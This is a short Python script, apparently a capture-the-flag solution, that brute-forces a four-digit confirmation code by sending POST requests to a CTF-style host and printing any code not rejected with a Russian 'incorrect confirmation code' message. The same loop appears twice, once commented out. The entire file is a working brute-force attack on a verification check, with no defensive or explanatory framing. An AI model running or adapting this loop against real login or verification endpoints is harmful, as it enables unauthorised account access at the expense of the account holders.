# import requests
# url = 'http://ctfinf.ru:10019/'
# for code in range(1000, 10000):
#     headers = {'auth': 'true', 'code': str(code)}
#     r = requests.post(f'{url}', data=headers)
#     if r.status_code == 200:
#         if 'Неверный код подтверждения' not in r.text:
#             print(code)
import requests
url = 'http://ctfinf.ru:10019/'
for code in range(1000, 10000):
    headers = {'auth': 'true', 'code': str(code)}
    r = requests.post(f'{url}', data=headers)
    if r.status_code == 200:
        if 'Неверный код подтверждения' not in r.text:
            print(code)